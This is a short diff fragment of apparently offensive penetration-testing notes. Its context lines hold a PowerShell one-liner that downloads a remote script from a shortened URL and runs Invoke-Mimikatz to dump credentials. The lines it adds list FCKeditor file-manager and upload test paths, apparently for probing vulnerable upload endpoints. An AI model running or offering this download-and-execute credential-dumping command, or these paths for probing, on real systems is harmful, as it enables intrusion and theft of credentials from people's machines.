@@ -49,3 +49,11 @@ The above screen-shot shows that the parenthesis (i.e., ()) have been filtered f
 
 Mimikatz:
 powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
+
+
+/FCKeditor/editor/filemanager/browser/default/browser.html
+/FCKeditor/editor/filemanager/browser/default/connectors/test.html
+/FCKeditor/editor/filemanager/connectors/uploadtest.html
+/FCKeditor/editor/filemanager/upload/test.html
+/fckeditor/editor/filemanager/browser/default/connectors/test.html
+/fckeditor/editor/filemanager/connectors/test.html
